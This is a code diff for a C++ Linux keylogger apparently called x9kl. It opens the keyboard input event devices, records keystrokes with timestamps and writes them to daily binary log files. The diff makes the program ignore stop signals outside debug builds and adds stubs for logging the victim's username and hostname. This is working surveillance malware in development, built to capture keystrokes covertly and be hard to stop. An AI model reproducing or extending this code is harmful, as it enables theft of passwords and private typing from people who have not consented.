@@ -44,7 +44,9 @@ volatile std::sig_atomic_t must_stop{0};
 static void sig_handler(int sig_num) {
   (void)sig_num;
 
+#ifdef DEBUG
   must_stop = 1;
+#endif  // DEBUG
 }
 
 static std::vector<std::string> get_event_files(void) {
@@ -52,7 +54,7 @@ static std::vector<std::string> get_event_files(void) {
 
   {
     std::ifstream file{"/proc/bus/input/devices"};
-    std::regex kb_regex{"H: Handlers=sysrq kbd (.+?) leds"};
+    std::regex kb_regex{"H: Handlers=sysrq kbd leds (event\\d{1,2})"};
     std::string line;
 
     while (std::getline(file, line)) {
@@ -113,6 +115,34 @@ static void destroy_ctx(x9kl_ctx_t *ctx) {
   }
 }
 
+static bool should_add_header() {
+  return false; // TODO
+}
+
+static void add_header_info(std::ofstream &file) {
+  // TODO
+  //   - write locale=X
+  //   - write username=Y
+  //   - write host=Z
+  //   - write endianess=W
+}
+
+static void add_timestamp(const tm *time, std::ofstream &file) {
+  std::vector<uint16_t> log_entry;
+
+  log_entry.emplace_back((time->tm_hour << 8) | time->tm_min);
+  log_entry.emplace_back((time->tm_sec << 8) | 0xff);
+
+  file.write((const char *)log_entry.data(), log_entry.size() * 2);
+}
+
+static void add_data(const std::vector<uint16_t> &data, std::ofstream &file) {
+  std::vector<uint16_t> log_entry;
+
+  log_entry.insert(log_entry.end(), data.begin(), data.end());
+  file.write((const char *)log_entry.data(), log_entry.size() * 2);
+}
+
 static void write_buffer_to_log(x9kl_ctx_t *ctx) {
   struct tm *time;
   char date[9]{0};
@@ -128,13 +158,12 @@ static void write_buffer_to_log(x9kl_ctx_t *ctx) {
   std::ofstream log_file{std::string{LOGS_DIR} + "/log_" + date,
                          std::ios::binary | std::ios::app};
 
-  std::vector<uint16_t> log_entry;
+  if (should_add_header()) {
+    add_header_info(log_file);
+  }
 
-  log_entry.emplace_back((time->tm_hour << 8) | time->tm_min);
-  log_entry.insert(log_entry.end(), ctx->kb_buffer.begin(),
-                   ctx->kb_buffer.end());
-
-  log_file.write((const char *)log_entry.data(), log_entry.size() * 2);
+  add_timestamp(time, log_file);
+  add_data(ctx->kb_buffer, log_file);
 }
 
 static void handle_enter(x9kl_ctx_t *ctx) {
@@ -229,7 +258,7 @@ static void handle_ascii_key(x9kl_ctx_t *ctx) {
   ctx->kb_buffer.insert(ctx->kb_buffer.begin() + ctx->buffer_cursor++, data);
 }
 
-void handle_key(x9kl_ctx_t *ctx) {
+static void handle_key(x9kl_ctx_t *ctx) {
   switch (ctx->event.code) {
     case KEY_ENTER:
       handle_enter(ctx);
@@ -279,7 +308,7 @@ static void mainloop(x9kl_ctx_t *ctx) {
 
     for (auto &fd : ctx->kb_fds) {
       if (FD_ISSET(fd, &rfds)) {
-        int n_bytes = read(fd, &ev, sizeof(struct input_event));
+        ssize_t n_bytes = read(fd, &ev, sizeof(struct input_event));
 
         if ((ev.type == EV_KEY) && (n_bytes > 0)) {
           X9KL_DEBUG("event received for key '%d'\n", ev.code);
